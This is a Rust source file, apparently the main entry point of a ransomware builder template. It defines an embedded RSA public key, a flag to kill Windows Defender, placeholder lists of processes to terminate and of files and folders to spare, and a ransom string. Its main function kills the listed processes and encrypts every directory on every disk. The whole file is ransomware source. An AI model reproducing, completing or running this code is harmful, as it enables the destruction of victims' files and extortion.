mod crypt;
mod sys;
mod utils;

// local use
use crypt::symmetric::aes_func::normal_encrypt_all_dir;
use sys::file_sys::FILESYS;
use sys::profile::{kill_process_byname, Profile};

// lib
use std::collections::HashSet;
use std::io::ErrorKind;
use std::thread;

static DEFAULT_PUBLIC_KEY: &str = "-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAvaK5/Hr+rDHf/1cZPjvyKU+daIdqD5cE1I3p3QXkuV+8glQ5L72j
jSVdoKXKxO/zBGYcs7lSsVRq08YR8inqAJvflFxc8g25pc0xNBvuI/Pv3Z0FY9C3
RIonJ86KW7Lr5xiRUavPOSU1wywNXi4TcSuE4lTnfuSgH4a17eDhJ0ePgTBtx+ju
1FkSQjjzNBgVj4mAwxBJYl7fLnXUdbwXoXZ6p4Ka48J/t4YIBWyUIfPgDi+j9Krn
rgJziAF4qXKfrq/0OHG6fi4HszdJJm7qe9feoloq/pbRXs73xYJQFNRI6T4CYAIB
1GUPplD45Qn5IZYQHVwJ7DFsmRc7bi1xVwIDAQAB
-----END RSA PUBLIC KEY-----";

static DEFAULT_ID: &str = "MIIBCgKCAQEAvaK5/Hr+rDHf/1cZPjvyKU+daIdqD5cE1I3p3QXkuV+8glQ5L72j";

static MODE: &str = "FALSE_ENCRYPT_ALL_BYTES";

static KILL_DEFENDER: &str = "TRUE_KILL_DEFFENDER";

static PROCESS_KILL : &str = "DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT;DEFAULT";

static WHITE_LIST_FILE : &str = "DEFAULTFILE;DEFAULTFILE;DEFAULTFILE;DEFAULTFILE;DEFAULTFILE;DEFAULTFILE;DEFAULTFILE;DEFAULTFILE;DEFAULTFILE;DEFAULTFILE;DEFAULTFILE;DEFAULTFILE";

static WHITE_LIST_FOLDER : &str = "DEFAULTFOLDER;DEFAULTFOLDER;DEFAULTFOLDER;DEFAULTFOLDER;DEFAULTFOLDER;DEFAULTFOLDER;DEFAULTFOLDER;DEFAULTFOLDER;DEFAULTFOLDER;DEFAULTFOLDER;DEFAULTFOLDER;DEFAULTFOLDER";

static DEFAULT_RANSOM: &str = "DEFAULTRANSOMETOPAYITSBIGUNIT";

fn main() {
    let profile = Profile::new();
    let mut white_list_folder = HashSet::new();
    let mut white_list_file = HashSet::new();

    for proc in PROCESS_KILL.split(';') {
        kill_process_byname(proc.to_string())
    }

    for folder in WHITE_LIST_FOLDER.split(";") {
        white_list_folder.insert(folder);
    }

    for file in WHITE_LIST_FILE.split(";") {
        white_list_file.insert(file);
    }

    thread::spawn(move || {
        for disk in profile.disks {
            if let Err(e) = normal_encrypt_all_dir(
                &disk,
                &DEFAULT_PUBLIC_KEY,
                "magic",
                &white_list_folder,
                &white_list_file,
            ) {
                if e.kind() == ErrorKind::PermissionDenied {
                    continue;
                } else {
                    println!("{}", e);
                }
            }
        }
    });
}
